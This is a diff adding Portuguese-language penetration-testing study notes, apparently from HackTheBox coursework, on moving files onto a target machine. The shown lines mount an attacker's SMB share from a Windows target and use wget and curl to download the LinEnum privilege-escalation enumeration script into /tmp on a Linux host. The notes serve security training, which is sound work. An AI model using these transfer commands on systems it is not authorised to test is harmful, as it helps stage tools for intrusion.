@@ -212,3 +212,20 @@ na maquina alvo
 ```
 net use Z: \\IP-atacante\share
 ```
+---
+
+# Métodos de transferência de arquivos do Linux
+
+### Downloads da Web com Wget e cURL
+
+- Para baixar um arquivo usando wget, precisamos especificar a URL e a opção `-O' para definir o nome do arquivo de saída.
+
+```
+Gust4vo@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+```
+
+- cURL é muito semelhante a wget, mas a opção de nome de arquivo de saída é `-o' minúsculo.
+
+```
+Gust4vo@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+```
